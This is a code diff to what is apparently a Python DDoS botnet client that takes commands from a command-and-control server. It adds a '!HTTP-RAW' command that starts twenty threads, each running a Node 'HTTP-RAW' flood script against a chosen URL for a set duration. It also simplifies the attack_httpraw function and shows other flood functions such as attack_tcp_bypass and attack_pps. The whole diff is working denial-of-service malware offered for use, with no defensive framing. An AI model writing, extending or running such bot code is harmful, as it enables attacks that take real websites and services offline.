@@ -133,14 +133,7 @@ def attack_tcp_bypass(ip, port, end_time, size):
 
 
 def attack_httpraw(url, end_time):
-    max_packets = 1950
-
-    while time.time() < end_time:
-        try:
-            os.system(f'node HTTP-RAW {url} {end_time}')
-            
-        except:
-            pass
+    os.system(f'node HTTP-RAW {url} {end_time}')
 
 
 
@@ -256,6 +249,14 @@ def main():
                     threads = 20
                     for _ in range(threads):
                         threading.Thread(target=attack_pps, args=(ip, port, end_time, size), daemon=True).start()
+                if command == '!HTTP-RAW':
+                    url = args[1]
+                    duration = int(args[2])
+                    end_time = time.time() + duration
+                    size = 65500
+                    threads = 20
+                    for _ in range(threads):
+                        threading.Thread(target=attack_httpraw, args=(url, end_time), daemon=True).start()
                 elif command == 'PING':
                     c2.send('PONG'.encode())
             except:
